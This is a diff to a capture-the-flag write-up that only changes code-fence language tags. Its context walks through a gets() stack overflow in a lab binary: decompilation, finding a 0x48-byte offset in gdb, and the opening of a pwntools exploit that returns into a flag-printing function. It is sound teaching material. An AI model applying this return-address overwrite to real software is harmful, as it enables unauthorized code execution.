@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file warmup
 warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
 $    ./warmup
@@ -13,7 +13,7 @@ WOW:0x40060d
 
 So we can see that we are dealing with a 64 bit binary. When we run it, it displays an address (looks like an address from the code section of the binary, versus another section like the libc) and prompts us for input. When we look at the main function in Ghidra, we see this:
 
-```
+```c
 void main(void)
 
 {
@@ -32,7 +32,7 @@ void main(void)
 
 So we can see that the address being printed is the address of the function `easy` (which when we look at it's address in Ghidra we see it's `0x40060d`). After that we can see it calls the function `gets`, which is a bug since it doesn't limit how much data it scans in (and since `input` can only hold `64` bytes of data, after we write `64` bytes we overflow the buffer and start overwriting other things in memory). With that bug we can totally reach the return address (the address on the stack that is executed after the `ret` call to return execution back to whatever code called it). For what to call, we see that the `easy` function will print the flag for us (in order to print the flag, we will need to have a `flag.txt` file in the same directory as the executable):
 
-```
+```c
 void easy(void)
 
 {
@@ -43,7 +43,7 @@ void easy(void)
 
 So let's use gdb to figure out how much data we need to send before overwriting the return address, so we can land the bug. I will just set a breakpoint for after the `gets` call:
 
-```
+```gdb
 gef➤  disas main
 Dump of assembler code for function main:
    0x000000000040061d <+0>:    push   rbp
@@ -149,13 +149,13 @@ Stack level 0, frame at 0x7fffffffdea0:
 ```
 
 With a bit of math, we see the offset:
-```
+```pycon
 >>> hex(0x7fffffffde98 - 0x7fffffffde50)
 '0x48'
 ```
 
 So we can see that after `0x48` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
-```
+```python
 from pwn import *
 
 target = process('./warmup')
@@ -173,7 +173,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python exploit.py
 [+] Starting local process './warmup': pid 4652
 [*] Switching to interactive mode
